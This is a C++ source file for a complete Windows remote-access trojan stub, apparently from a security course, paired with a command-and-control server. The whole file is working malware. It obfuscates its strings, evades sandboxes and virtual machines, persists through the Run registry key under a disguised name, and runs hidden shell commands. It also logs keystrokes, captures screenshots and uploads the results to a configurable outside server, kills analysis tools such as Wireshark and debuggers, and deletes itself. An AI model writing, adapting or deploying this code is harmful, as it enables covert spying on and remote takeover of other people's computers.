/*
  full_stub.cpp — Complete RAT stub (Module 09 workable tool)
  ============================================================
  Pairs with the c2-server/ from this repository.
  For authorized security curriculum use only — do not deploy against
  systems you do not own.

  Compile (MinGW x64, no console window):
    g++ -std=c++17 -O2 -mwindows -s -fno-ident \
        -static-libgcc -static-libstdc++ \
        full_stub.cpp \
        -lwininet -lgdiplus -ladvapi32 -lkernel32 \
        -luser32 -lgdi32 -lole32 \
        -o stub.exe

  Config injection:
    Run the Builder on stub.exe after compiling to embed C2 host/port/auth.
    Standalone fallback: connects to 127.0.0.1:4444 with auth "changeme".

  C2 API endpoints used:
    GET /checkin?auth=<key>&id=<id>&info=<info>
    GET /cmd?auth=<key>&id=<id>           → returns command string or ""
    GET /result?auth=<key>&id=<id>&data=<urlenc_result>
    POST /upload?auth=<key>&id=<id>       → multipart file upload
*/

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <intrin.h>
#include <objidl.h>
#include <gdiplus.h>
#include <thread>
#include <mutex>
#include <atomic>
#include <string>
#include <vector>
#include <sstream>
#include <algorithm>
#include <random>
#include <chrono>

#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"gdiplus.lib")
#pragma comment(lib,"advapi32.lib")

// ─── compile-time string obfuscation ─────────────────────────────────────────
// Plaintext never appears in .rdata; all string literals below decode at runtime
template <size_t N>
struct ObfStr {
    char data[N];
    constexpr ObfStr(const char (&s)[N]) : data{} {
        for (size_t i = 0; i < N; i++) data[i] = s[i] ^ 0x5A;
    }
    std::string d() const {
        std::string o(data, N-1);
        for (char& c : o) c ^= 0x5A;
        return o;
    }
};

constexpr ObfStr OB_USERAGENT  ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
constexpr ObfStr OB_RUN_KEY    ("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
constexpr ObfStr OB_APPDATA_SUB("Microsoft\\Windows\\Helpers");
constexpr ObfStr OB_GUID_KEY   ("SOFTWARE\\Microsoft\\Cryptography");
constexpr ObfStr OB_GUID_VAL   ("MachineGuid");
constexpr ObfStr OB_CHECKIN    ("/checkin?auth=");
constexpr ObfStr OB_CMD        ("/cmd?auth=");
constexpr ObfStr OB_RESULT     ("/result?auth=");
constexpr ObfStr OB_UPLOAD     ("/upload?auth=");

constexpr ObfStr OB_CMD_SHELL   ("shell");
constexpr ObfStr OB_CMD_SCREEN  ("screenshot");
constexpr ObfStr OB_CMD_KEYLOG  ("keylog");
constexpr ObfStr OB_CMD_LS      ("ls");
constexpr ObfStr OB_CMD_PING    ("ping");
constexpr ObfStr OB_CMD_UNINSTALL("uninstall");
constexpr ObfStr OB_BOTNAME      ("WinHelper");

// ─── config struct ────────────────────────────────────────────────────────────
// Layout matches Manager::Settings (Manager.h) and STUB_STRUCT in constants.js.
// Builder XOR-encrypts this block before appending; readConfig XOR-decrypts it.
#pragma pack(push, 1)
struct Config {
    char    botapi[128];        // offset   0: C2 URL "[https://]host[:port]"
    char    _aeskey[16];        // offset 128: unused (AES key slot in MSVC stub)
    char    chatid[128];        // offset 144: auth key (C2_AUTH value)
    char    drop[128];          // offset 272: drop path (unused)
    uint8_t drop_run;           // offset 400
    char    scheduler_name[50]; // offset 401
    uint8_t scheduler_state;    // offset 451
    char    autorun[128];       // offset 452: autorun registry value name
    uint8_t autorun_state;      // offset 580
    char    client_delay[10];   // offset 581: poll interval ms as decimal string
    uint8_t auto_delete;        // offset 591
    uint8_t protector;          // offset 592
    char    protectorName[50];  // offset 593
};
#pragma pack(pop)
static_assert(sizeof(Config) == 643, "Config must be 643 bytes");

static const uint8_t MAGIC[8] = {0xB4,0x4B,0xD4,0x3E,0x7A,0x91,0xC3,0xF8};

// ─── globals ──────────────────────────────────────────────────────────────────
static Config            g_cfg;
static std::string       g_botId;
static std::string       g_keyBuf;
static std::mutex        g_keyMtx;
static std::atomic<bool> g_run{true};
static HHOOK             g_kbHook = nullptr;
// Parsed from g_cfg.botapi after readConfig()
static std::string       g_c2host;
static INTERNET_PORT     g_c2port = 4444;
static bool              g_use_https = true;

// ─── config: read from appended struct or use defaults ────────────────────────
// The builder XOR-encrypts the 643-byte settings block before appending it.
// Key derivation: rotate-left-3 XOR over the first 1024 bytes of the stub binary.
static bool readConfig(Config* cfg) {
    char self[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, self, MAX_PATH);
    HANDLE hf = CreateFileA(self, GENERIC_READ, FILE_SHARE_READ,
                             nullptr, OPEN_EXISTING, 0, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER sz{}; GetFileSizeEx(hf, &sz);
    if (sz.QuadPart < (LONGLONG)(8 + sizeof(Config))) { CloseHandle(hf); return false; }

    // Derive 8-byte XOR key from first 1024 bytes of self
    uint8_t stub1k[1024] = {};
    DWORD rd = 0;
    LARGE_INTEGER zero{};
    SetFilePointerEx(hf, zero, nullptr, FILE_BEGIN);
    ReadFile(hf, stub1k, sizeof(stub1k), &rd, nullptr);
    uint8_t xkey[8] = {};
    for (DWORD i = 0; i < rd; i++) {
        uint8_t b = xkey[i % 8] ^ stub1k[i];
        b = (uint8_t)((b << 3) | (b >> 5));
        xkey[i % 8] = b;
    }

    LARGE_INTEGER pos{};
    pos.QuadPart = sz.QuadPart - (LONGLONG)(8 + sizeof(Config));
    SetFilePointerEx(hf, pos, nullptr, FILE_BEGIN);
    uint8_t magic[8] = {};
    ReadFile(hf, magic, 8, &rd, nullptr);
    bool hasCfg = (rd == 8 && memcmp(magic, MAGIC, 8) == 0);
    if (hasCfg) {
        ReadFile(hf, cfg, sizeof(Config), &rd, nullptr);
        // XOR-decrypt
        uint8_t* raw = reinterpret_cast<uint8_t*>(cfg);
        for (size_t i = 0; i < sizeof(Config); i++) raw[i] ^= xkey[i % 8];
    }
    CloseHandle(hf);

    if (!hasCfg || cfg->botapi[0] == '\0') {
        // fallback defaults — works standalone against local dev server
        strncpy(cfg->botapi,  "127.0.0.1", sizeof(cfg->botapi)-1);
        strncpy(cfg->chatid,  "changeme",  sizeof(cfg->chatid)-1);
        cfg->client_delay[0] = '\0';
        cfg->autorun[0]      = '\0';
        cfg->autorun_state   = 0;
    }
    return true;
}

// ─── parse botapi URL into g_c2host / g_c2port / g_use_https ─────────────────
static void parseC2Config() {
    std::string url(g_cfg.botapi);
    g_use_https = (url.rfind("https://", 0) == 0);
    std::string hostport;
    if      (url.rfind("https://", 0) == 0) hostport = url.substr(8);
    else if (url.rfind("http://",  0) == 0) hostport = url.substr(7);
    else                                    hostport = url;
    size_t colon = hostport.rfind(':');
    if (colon != std::string::npos) {
        g_c2host = hostport.substr(0, colon);
        g_c2port = (INTERNET_PORT)std::stoi(hostport.substr(colon + 1));
    } else {
        g_c2host = hostport;
        g_c2port = g_use_https ? 443 : 80;
    }
}

// ─── sandbox / environment checks ────────────────────────────────────────────
static int sandboxScore() {
    int s = 0;
    SYSTEM_INFO si{}; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2)          s += 30; // single CPU
    if (GetTickCount64() < 5ULL*60*1000)      s += 20; // cold boot <5min
    if (GetSystemMetrics(SM_CXSCREEN) < 800)  s += 20; // small screen
    char user[128]{}; DWORD ul=sizeof(user);
    GetUserNameA(user, &ul);
    std::string u(user); for(auto& c:u) c=(char)tolower(c);
    const char* bad[]={"sandbox","malware","virus","analyst","sample",nullptr};
    for(int i=0;bad[i];++i) if(u.find(bad[i])!=std::string::npos) s+=20;
    int r[4]={}; __cpuid(r, 1);
    if ((r[2]>>31)&1) s += 20; // hypervisor bit
    return s;
}

// QPC-based timing check: detect sleep acceleration (sandboxes skip Sleep())
static bool sleepAccelerated() {
    LARGE_INTEGER f, t0, t1;
    QueryPerformanceFrequency(&f);
    QueryPerformanceCounter(&t0);
    Sleep(3000);
    QueryPerformanceCounter(&t1);
    double elapsed = (double)(t1.QuadPart - t0.QuadPart) / f.QuadPart;
    return elapsed < 1.5; // was supposed to be 3s — if <1.5s, accelerated
}

// Jittered startup delay — 9s split into 3 chunks to frustrate timeout-based sandboxes
static void startupDelay() {
    for (int i = 0; i < 3; ++i) {
        Sleep(3000);
        if (sleepAccelerated()) ExitProcess(0); // in sandbox — abort
    }
}

// ─── bot ID ───────────────────────────────────────────────────────────────────
static std::string getBotId() {
    char guid[64] = {}; DWORD sz = sizeof(guid);
    HKEY hk = nullptr;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, OB_GUID_KEY.d().c_str(), 0, KEY_READ, &hk)==ERROR_SUCCESS) {
        RegQueryValueExA(hk, OB_GUID_VAL.d().c_str(), nullptr, nullptr, (LPBYTE)guid, &sz);
        RegCloseKey(hk);
    }
    if (!guid[0]) {
        // fallback to volume serial + hostname
        char hn[64]={}; DWORD hs=sizeof(hn); GetComputerNameA(hn,&hs);
        DWORD vol=0; GetVolumeInformationA("C:\\",nullptr,0,&vol,nullptr,nullptr,nullptr,0);
        char buf[64]; snprintf(buf,sizeof(buf),"%08X-%s",vol,hn);
        return buf;
    }
    // Strip hyphens to make a clean token
    std::string s(guid); s.erase(std::remove(s.begin(),s.end(),'-'),s.end());
    return s;
}

// ─── parent process name (for carrier-delivery telemetry) ────────────────────
// Uses W variants — MinGW does not always expose the explicit A variants.
static std::string getParentProcName() {
    DWORD myPid = GetCurrentProcessId(), ppid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "unknown";
    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ProcessID == myPid) { ppid = pe.th32ParentProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    if (ppid && Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ProcessID == ppid) {
                CloseHandle(snap);
                std::wstring ws(pe.szExeFile);
                std::string n(ws.begin(), ws.end());
                for (auto& c : n) c = (char)tolower((unsigned char)c);
                return n;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return "unknown";
}

// ─── info string ─────────────────────────────────────────────────────────────
static std::string getInfo() {
    char hn[64]={},user[64]={};
    DWORD hs=sizeof(hn),us=sizeof(user);
    GetComputerNameA(hn,&hs); GetUserNameA(user,&us);
    OSVERSIONINFOEXA osv{sizeof(osv)};
    typedef NTSTATUS(WINAPI*RtlGV)(PRTL_OSVERSIONINFOW);
    auto fn=(RtlGV)GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlGetVersion");
    if(fn) fn((PRTL_OSVERSIONINFOW)&osv);
    std::string pname = getParentProcName();
    char buf[320];
    snprintf(buf,sizeof(buf),"host=%s|user=%s|os=Win%u.%u.%u|arch=%s|pid=%lu|pname=%s",
             hn,user,osv.dwMajorVersion,osv.dwMinorVersion,osv.dwBuildNumber,
#ifdef _WIN64
             "x64",
#else
             "x86",
#endif
             GetCurrentProcessId(), pname.c_str());
    return buf;
}

// ─── URL encode ──────────────────────────────────────────────────────────────
static std::string urlEncode(const std::string& s) {
    std::ostringstream oss;
    for (unsigned char c : s) {
        if (isalnum(c)||c=='-'||c=='_'||c=='.'||c=='~') oss<<(char)c;
        else { char buf[4]; snprintf(buf,sizeof(buf),"%%%02X",c); oss<<buf; }
    }
    return oss.str();
}

// ─── WinINet HTTP helper ───────────────────────────────────────────────────────
static std::string httpGet(const char* host, INTERNET_PORT port, bool https,
                            const std::string& path) {
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_PRAGMA_NOCACHE;
    if (https) flags |= INTERNET_FLAG_SECURE |
                        INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

    HINTERNET hi = InternetOpenA(OB_USERAGENT.d().c_str(),
                                  INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hi) return "";
    HINTERNET hc = InternetConnectA(hi, host, port, nullptr, nullptr,
                                     INTERNET_SERVICE_HTTP, 0, 0);
    if (!hc) { InternetCloseHandle(hi); return ""; }
    HINTERNET hr = HttpOpenRequestA(hc, "GET", path.c_str(), nullptr, nullptr,
                                     nullptr, flags, 0);
    if (!hr) { InternetCloseHandle(hc); InternetCloseHandle(hi); return ""; }

    DWORD opt = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE;
    InternetSetOptionA(hr, INTERNET_OPTION_SECURITY_FLAGS, &opt, sizeof(opt));

    std::string result;
    if (HttpSendRequestA(hr, nullptr, 0, nullptr, 0)) {
        char buf[4096]; DWORD rd = 0;
        while (InternetReadFile(hr, buf, sizeof(buf)-1, &rd) && rd > 0)
            result.append(buf, rd);
    }
    InternetCloseHandle(hr); InternetCloseHandle(hc); InternetCloseHandle(hi);
    return result;
}

// Upload file via multipart POST
static bool httpUpload(const char* host, INTERNET_PORT port, bool https,
                        const std::string& path, const std::vector<uint8_t>& data,
                        const char* fieldname, const char* filename) {
    DWORD flags = INTERNET_FLAG_RELOAD;
    if (https) flags |= INTERNET_FLAG_SECURE |
                        INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

    std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    std::string hdr  = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
    std::string body;
    body  = "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"" + std::string(fieldname) + "\"; filename=\"" + filename + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append((char*)data.data(), data.size());
    body += "\r\n--" + boundary + "--\r\n";

    HINTERNET hi = InternetOpenA(OB_USERAGENT.d().c_str(),
                                  INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hi) return false;
    HINTERNET hc = InternetConnectA(hi, host, port, nullptr, nullptr,
                                     INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hr = HttpOpenRequestA(hc, "POST", path.c_str(), nullptr, nullptr, nullptr, flags, 0);
    DWORD opt = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    if (https) InternetSetOptionA(hr, INTERNET_OPTION_SECURITY_FLAGS, &opt, sizeof(opt));
    bool ok = HttpSendRequestA(hr, hdr.c_str(), (DWORD)hdr.size(),
                                (LPVOID)body.c_str(), (DWORD)body.size()) != FALSE;
    InternetCloseHandle(hr); InternetCloseHandle(hc); InternetCloseHandle(hi);
    return ok;
}

// ─── C2 primitives ────────────────────────────────────────────────────────────
static void c2Checkin() {
    std::string path = OB_CHECKIN.d() + g_cfg.chatid +
                       "&id=" + g_botId + "&info=" + urlEncode(getInfo());
    httpGet(g_c2host.c_str(), g_c2port, g_use_https, path);
}

static std::string c2GetCmd() {
    std::string path = OB_CMD.d() + g_cfg.chatid + "&id=" + g_botId;
    return httpGet(g_c2host.c_str(), g_c2port, g_use_https, path);
}

static void c2SendResult(const std::string& data) {
    std::string path = OB_RESULT.d() + g_cfg.chatid +
                       "&id=" + g_botId + "&data=" + urlEncode(data);
    httpGet(g_c2host.c_str(), g_c2port, g_use_https, path);
}

static void c2UploadFile(const std::vector<uint8_t>& data, const char* fname) {
    std::string path = OB_UPLOAD.d() + g_cfg.chatid + "&id=" + g_botId;
    httpUpload(g_c2host.c_str(), g_c2port, g_use_https, path, data, "file", fname);
}

// ─── persistence ──────────────────────────────────────────────────────────────
static void installPersistence() {
    char self[MAX_PATH]={}, appData[MAX_PATH]={}, dst[MAX_PATH]={};
    GetModuleFileNameA(nullptr, self, MAX_PATH);
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData);
    // Use autorun name from config if set, otherwise fall back to fixed name
    const char* regName = (g_cfg.autorun_state && g_cfg.autorun[0])
                          ? g_cfg.autorun : OB_BOTNAME.d().c_str();
    snprintf(dst, sizeof(dst), "%s\\%s\\%s.exe", appData,
             OB_APPDATA_SUB.d().c_str(), regName);
    // Create subdirectory
    std::string subdir = std::string(appData) + "\\" + OB_APPDATA_SUB.d();
    CreateDirectoryA(subdir.c_str(), nullptr);
    CopyFileA(self, dst, FALSE);

    // HKCU Run key
    HKEY hk=nullptr;
    RegCreateKeyExA(HKEY_CURRENT_USER, OB_RUN_KEY.d().c_str(), 0, nullptr,
                    REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hk, nullptr);
    if (hk) {
        RegSetValueExA(hk, regName, 0, REG_SZ,
                       (BYTE*)dst, (DWORD)strlen(dst)+1);
        RegCloseKey(hk);
    }
}

static void removePersistence() {
    const char* regName = (g_cfg.autorun_state && g_cfg.autorun[0])
                          ? g_cfg.autorun : OB_BOTNAME.d().c_str();
    HKEY hk=nullptr;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, OB_RUN_KEY.d().c_str(),
                      0, KEY_SET_VALUE, &hk)==ERROR_SUCCESS) {
        RegDeleteValueA(hk, regName);
        RegCloseKey(hk);
    }
}

// ─── shell exec (CreateProcess + anonymous pipes) ────────────────────────────
// No _popen, no cmd.exe window visible to user
static std::string execShell(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{sizeof(sa), nullptr, TRUE};
    HANDLE hRead=nullptr, hWrite=nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "[pipe error]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{sizeof(si)};
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi{};
    // "cmd /c <cmd>" — hidden, no window
    std::string full = "cmd.exe /c " + cmd;
    char* cmdline = new char[full.size()+1];
    memcpy(cmdline, full.c_str(), full.size()+1);

    bool ok = CreateProcessA(nullptr, cmdline, nullptr, nullptr, TRUE,
                              CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi) != 0;
    CloseHandle(hWrite);
    delete[] cmdline;

    std::string out;
    if (ok) {
        char buf[4096]; DWORD rd=0;
        while (ReadFile(hRead, buf, sizeof(buf)-1, &rd, nullptr) && rd>0)
            out.append(buf, rd);
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    CloseHandle(hRead);
    if (out.empty()) out = "(no output)";
    // Trim to 8KB to avoid huge URL
    if (out.size() > 8192) out = out.substr(0, 8192) + "\n[...truncated]";
    return out;
}

// ─── screenshot (GDI+) ───────────────────────────────────────────────────────
static int getEncoderClsid(const WCHAR* fmt, CLSID* clsid) {
    UINT n=0, sz=0;
    Gdiplus::GetImageEncodersSize(&n, &sz);
    if (!sz) return -1;
    std::vector<uint8_t> buf(sz);
    Gdiplus::ImageCodecInfo* codecs = (Gdiplus::ImageCodecInfo*)buf.data();
    Gdiplus::GetImageEncoders(n, sz, codecs);
    for (UINT i=0; i<n; ++i) if (!wcscmp(codecs[i].MimeType, fmt)) { *clsid=codecs[i].Clsid; return i; }
    return -1;
}

static std::vector<uint8_t> captureScreen() {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc   = GetDC(nullptr);
    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(hdcMem, hbm);
    BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    ReleaseDC(nullptr, hdc);
    DeleteDC(hdcMem);

    std::vector<uint8_t> result;
    IStream* stream = nullptr;
    if (SUCCEEDED(CreateStreamOnHGlobal(nullptr, TRUE, &stream))) {
        Gdiplus::Bitmap bmp(hbm, nullptr);
        CLSID jpegClsid;
        if (getEncoderClsid(L"image/jpeg", &jpegClsid) >= 0) {
            Gdiplus::EncoderParameters ep;
            ep.Count = 1; ep.Parameter[0].Guid = Gdiplus::EncoderQuality;
            ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
            ep.Parameter[0].NumberOfValues = 1;
            ULONG quality = 60; ep.Parameter[0].Value = &quality;
            bmp.Save(stream, &jpegClsid, &ep);
            STATSTG stat{}; stream->Stat(&stat, STATFLAG_NONAME);
            ULARGE_INTEGER pos{}; LARGE_INTEGER z{};
            stream->Seek(z, STREAM_SEEK_SET, nullptr);
            result.resize((size_t)stat.cbSize.QuadPart);
            ULONG rd=0; stream->Read(result.data(), (ULONG)result.size(), &rd);
            result.resize(rd);
        }
        stream->Release();
    }
    DeleteObject(hbm);
    return result;
}

// ─── keylogger ────────────────────────────────────────────────────────────────
static LRESULT CALLBACK keyProc(int nCode, WPARAM wp, LPARAM lp) {
    if (nCode >= 0 && wp == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lp;
        char key = (char)MapVirtualKeyA(ks->vkCode, MAPVK_VK_TO_CHAR);
        if (key >= 0x20 && key < 0x7F) {
            std::lock_guard<std::mutex> lk(g_keyMtx);
            g_keyBuf += key;
        } else if (ks->vkCode == VK_RETURN) {
            std::lock_guard<std::mutex> lk(g_keyMtx);
            g_keyBuf += '\n';
        }
    }
    return CallNextHookEx(nullptr, nCode, wp, lp);
}

static void installKeylogger() {
    g_kbHook = SetWindowsHookExA(WH_KEYBOARD_LL, keyProc, GetModuleHandleA(nullptr), 0);
    // Run a message pump so the hook receives events
    MSG msg;
    while (g_run && GetMessageA(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg); DispatchMessageA(&msg);
    }
}

static std::string flushKeys() {
    std::lock_guard<std::mutex> lk(g_keyMtx);
    std::string out = g_keyBuf.empty() ? "(empty)" : g_keyBuf;
    g_keyBuf.clear();
    return out;
}

// ─── directory listing ────────────────────────────────────────────────────────
static std::string listDir(const std::string& path) {
    std::string pattern = path + "\\*";
    WIN32_FIND_DATAA fd{}; std::string out;
    HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return "[error: cannot open dir]";
    do {
        if (fd.cFileName[0]=='.') continue;
        char line[MAX_PATH+64];
        bool isdir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        LARGE_INTEGER fsz{}; fsz.LowPart=fd.nFileSizeLow; fsz.HighPart=fd.nFileSizeHigh;
        snprintf(line,sizeof(line),"%c  %12lld  %s\n", isdir?'D':'F', fsz.QuadPart, fd.cFileName);
        out += line;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return out.empty() ? "(empty)" : out;
}

// ─── anti-analyst thread ──────────────────────────────────────────────────────
static const char* KILL_LIST[] = {
    "wireshark.exe","procmon.exe","procmon64.exe","x64dbg.exe","x32dbg.exe",
    "processhacker.exe","tcpview.exe","autoruns.exe","filemon.exe","regmon.exe",nullptr
};

static void antiAnalystThread() {
    while (g_run) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe{sizeof(pe)};
            if (Process32First(snap, &pe)) do {
                std::string n(pe.szExeFile);
                for (auto& c:n) c=(char)tolower(c);
                for (int i=0; KILL_LIST[i]; ++i) if (n == KILL_LIST[i]) {
                    HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); }
                }
            } while (Process32Next(snap, &pe));
            CloseHandle(snap);
        }
        Sleep(3000);
    }
}

// ─── uninstall ────────────────────────────────────────────────────────────────
static void uninstall() {
    removePersistence();
    if (g_kbHook) { UnhookWindowsHookEx(g_kbHook); g_kbHook=nullptr; }
    g_run = false;
    // self-delete: batch trick
    char self[MAX_PATH]={};
    GetModuleFileNameA(nullptr, self, MAX_PATH);
    char bat[MAX_PATH+64];
    snprintf(bat, sizeof(bat), "cmd.exe /c ping 127.0.0.1 -n 2 > nul & del /f /q \"%s\"", self);
    STARTUPINFOA si{sizeof(si)}; si.wShowWindow=SW_HIDE; si.dwFlags=STARTF_USESHOWWINDOW;
    PROCESS_INFORMATION pi{};
    CreateProcessA(nullptr, bat, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
    ExitProcess(0);
}

// ─── command dispatch ─────────────────────────────────────────────────────────
static void dispatch(const std::string& cmd) {
    if (cmd.empty()) return;

    auto startsWith = [](const std::string& s, const std::string& p) {
        return s.size() >= p.size() && s.compare(0, p.size(), p) == 0;
    };

    if (cmd == OB_CMD_PING.d()) {
        c2SendResult("pong");
    }
    else if (cmd == OB_CMD_UNINSTALL.d()) {
        c2SendResult("uninstalling");
        uninstall();
    }
    else if (cmd == OB_CMD_SCREEN.d()) {
        auto jpg = captureScreen();
        if (!jpg.empty()) c2UploadFile(jpg, "screen.jpg");
        else c2SendResult("[screenshot failed]");
    }
    else if (cmd == OB_CMD_KEYLOG.d()) {
        c2SendResult(flushKeys());
    }
    else if (startsWith(cmd, OB_CMD_LS.d() + " ")) {
        std::string path = cmd.substr(3);
        while (!path.empty() && path[0]==' ') path.erase(0,1);
        c2SendResult(listDir(path));
    }
    else if (startsWith(cmd, OB_CMD_SHELL.d() + " ")) {
        std::string sh = cmd.substr(6);
        c2SendResult(execShell(sh));
    }
    else {
        // treat bare commands as shell commands
        c2SendResult(execShell(cmd));
    }
}

// ─── C2 main loop ─────────────────────────────────────────────────────────────
static void c2Loop() {
    std::mt19937 rng((unsigned)GetTickCount());
    c2Checkin();
    while (g_run) {
        std::string cmd = c2GetCmd();
        // Trim whitespace
        while (!cmd.empty() && (cmd.back()=='\r'||cmd.back()=='\n'||cmd.back()==' '))
            cmd.pop_back();
        if (!cmd.empty()) dispatch(cmd);
        // Jitter: base 5s ± 3s
        int jitter = (int)(rng()%6000) - 3000;
        DWORD sleep_ms = (DWORD)(5000 + jitter);
        if (sleep_ms < 2000) sleep_ms = 2000;
        Sleep(sleep_ms);
        c2Checkin(); // refresh lastSeen on each poll
    }
}

// ─── WinMain ──────────────────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // 1. Read config + parse C2 URL
    if (!readConfig(&g_cfg)) ExitProcess(0);
    parseC2Config();

    // 2. Sandbox gate
    if (sandboxScore() >= 50) ExitProcess(0);
    if (sleepAccelerated())   ExitProcess(0);

    // 3. Startup delay
    startupDelay();

    // 4. Single instance
    std::string mutexName = std::string("Global\\") + OB_BOTNAME.d();
    HANDLE hMutex = CreateMutexA(nullptr, TRUE, mutexName.c_str());
    if (GetLastError() == ERROR_ALREADY_EXISTS) { CloseHandle(hMutex); ExitProcess(0); }

    // 5. Bot ID
    g_botId = getBotId();

    // 6. Initialize GDI+
    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR gdiplusToken = 0;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gsi, nullptr);

    // 7. Persistence
    installPersistence();

    // 8. Background threads
    std::thread tAnti(antiAnalystThread);  tAnti.detach();
    std::thread tKeys(installKeylogger);   tKeys.detach();

    // 9. C2 loop (blocks)
    c2Loop();

    Gdiplus::GdiplusShutdown(gdiplusToken);
    CloseHandle(hMutex);
    return 0;
}
